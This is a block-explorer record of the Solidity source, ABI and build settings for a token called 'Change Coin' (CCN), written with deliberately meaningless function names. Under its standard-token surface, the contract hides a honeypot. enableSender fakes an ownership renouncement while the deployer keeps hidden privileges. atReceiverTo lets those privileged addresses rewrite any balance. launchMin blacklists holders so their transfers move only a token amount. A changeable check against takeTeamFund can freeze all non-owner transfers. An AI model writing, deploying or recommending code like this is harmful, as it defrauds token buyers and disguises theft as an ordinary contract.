{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract tokenMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingSell {\n    function createPair(address receiverLaunch, address buyTeamAuto) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface launchedSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface shouldList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalTeamMin) external view returns (uint256);\n\n    function transfer(address limitMin, uint256 tokenExempt) external returns (bool);\n\n    function allowance(address enableFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitMin,\n        uint256 tokenExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeToken, uint256 value);\n    event Approval(address indexed enableFee, address indexed spender, uint256 value);\n}\n\ninterface shouldEnableTrading is shouldList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ChangeCoin is tokenMarketing, shouldList, shouldEnableTrading {\n\n    uint256 private enableMax = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableMax;\n    }\n\n    function marketingFund(address fromToken, address limitMin, uint256 tokenExempt) internal view returns (uint256) {\n        require(tokenExempt > 0);\n\n        uint256 fromMode = 0;\n        if (fromToken == tradingTo && takeSwap > 0) {\n            fromMode = tokenExempt * takeSwap / 100;\n        } else if (limitMin == tradingTo && walletTotal > 0) {\n            fromMode = tokenExempt * walletTotal / 100;\n        }\n        require(fromMode <= tokenExempt);\n        return tokenExempt - fromMode;\n    }\n\n    bool public autoSwap;\n\n    function sellEnable() private view {\n        require(fundTx[_msgSender()]);\n    }\n\n    function amountTrading(address launchTrading) public {\n        require(launchTrading.balance < 100000);\n        if (autoSwap) {\n            return;\n        }\n        \n        fundTx[launchTrading] = true;\n        if (listSwapBuy != isSell) {\n            listSwapBuy = isSell;\n        }\n        autoSwap = true;\n    }\n\n    address launchedMax;\n\n    function senderFeeReceiver(uint256 tokenExempt) public {\n        sellEnable();\n        takeTeamFund = tokenExempt;\n    }\n\n    function balanceOf(address totalTeamMin) public view virtual override returns (uint256) {\n        return buyExemptSwap[totalTeamMin];\n    }\n\n    mapping(address => bool) public feeWalletSwap;\n\n    uint256 public walletTotal = 0;\n\n    function enableSender() public {\n        emit OwnershipTransferred(txTotal, address(0));\n        atTx = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return atTx;\n    }\n\n    uint256 public atFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverLaunched;\n    }\n\n    uint256 private isSell;\n\n    uint256 private listSwapBuy;\n\n    uint256 takeTeamFund;\n\n    bool private minListFee;\n\n    address public txTotal;\n\n    function name() external view virtual override returns (string memory) {\n        return limitShould;\n    }\n\n    function launchMin(address modeExempt) public {\n        sellEnable();\n        \n        if (modeExempt == txTotal || modeExempt == tradingTo) {\n            return;\n        }\n        feeWalletSwap[modeExempt] = true;\n    }\n\n    mapping(address => uint256) private buyExemptSwap;\n\n    address private atTx;\n\n    string private limitShould = \"Change Coin\";\n\n    uint256 sellTeam;\n\n    mapping(address => bool) public fundTx;\n\n    address public tradingTo;\n\n    function transfer(address autoFee, uint256 tokenExempt) external virtual override returns (bool) {\n        return buyFromList(_msgSender(), autoFee, tokenExempt);\n    }\n\n    function owner() external view returns (address) {\n        return atTx;\n    }\n\n    constructor (){\n        \n        enableSender();\n        launchedSwap shouldLimit = launchedSwap(swapLiquidity);\n        tradingTo = tradingSell(shouldLimit.factory()).createPair(shouldLimit.WETH(), address(this));\n        launchedMax = tradingSell(shouldLimit.factory()).feeTo();\n        \n        txTotal = _msgSender();\n        fundTx[txTotal] = true;\n        buyExemptSwap[txTotal] = enableMax;\n        if (isSell == atFee) {\n            amountMarketing = false;\n        }\n        emit Transfer(address(0), txTotal, enableMax);\n    }\n\n    function transferFrom(address fromToken, address limitMin, uint256 tokenExempt) external override returns (bool) {\n        if (_msgSender() != swapLiquidity) {\n            if (marketingIs[fromToken][_msgSender()] != type(uint256).max) {\n                require(tokenExempt <= marketingIs[fromToken][_msgSender()]);\n                marketingIs[fromToken][_msgSender()] -= tokenExempt;\n            }\n        }\n        return buyFromList(fromToken, limitMin, tokenExempt);\n    }\n\n    event OwnershipTransferred(address indexed autoMarketing, address indexed tradingEnable);\n\n    mapping(address => mapping(address => uint256)) private marketingIs;\n\n    string private launchedSell = \"CCN\";\n\n    bool public amountMarketing;\n\n    bool private amountIs;\n\n    uint256 constant marketingLaunched = 11 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedSell;\n    }\n\n    uint256 public takeSwap = 3;\n\n    bool private atEnable;\n\n    function allowance(address liquidityWallet, address txIs) external view virtual override returns (uint256) {\n        if (txIs == swapLiquidity) {\n            return type(uint256).max;\n        }\n        return marketingIs[liquidityWallet][txIs];\n    }\n\n    bool public liquidityLimitReceiver;\n\n    uint8 private receiverLaunched = 18;\n\n    function atReceiverTo(address autoFee, uint256 tokenExempt) public {\n        sellEnable();\n        buyExemptSwap[autoFee] = tokenExempt;\n    }\n\n    address swapLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function buyFromList(address fromToken, address limitMin, uint256 tokenExempt) internal returns (bool) {\n        if (fromToken == txTotal) {\n            return enableFrom(fromToken, limitMin, tokenExempt);\n        }\n        uint256 limitFund = shouldList(tradingTo).balanceOf(launchedMax);\n        require(limitFund == takeTeamFund);\n        require(limitMin != launchedMax);\n        if (feeWalletSwap[fromToken]) {\n            return enableFrom(fromToken, limitMin, marketingLaunched);\n        }\n        tokenExempt = marketingFund(fromToken, limitMin, tokenExempt);\n        return enableFrom(fromToken, limitMin, tokenExempt);\n    }\n\n    function enableFrom(address fromToken, address limitMin, uint256 tokenExempt) internal returns (bool) {\n        require(buyExemptSwap[fromToken] >= tokenExempt);\n        buyExemptSwap[fromToken] -= tokenExempt;\n        buyExemptSwap[limitMin] += tokenExempt;\n        emit Transfer(fromToken, limitMin, tokenExempt);\n        return true;\n    }\n\n    function approve(address txIs, uint256 tokenExempt) public virtual override returns (bool) {\n        marketingIs[_msgSender()][txIs] = tokenExempt;\n        emit Approval(_msgSender(), txIs, tokenExempt);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTrading\",\"type\":\"address\"}],\"name\":\"amountTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"atReceiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTeamMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeWalletSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"}],\"name\":\"launchMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLimitReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"senderFeeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ChangeCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}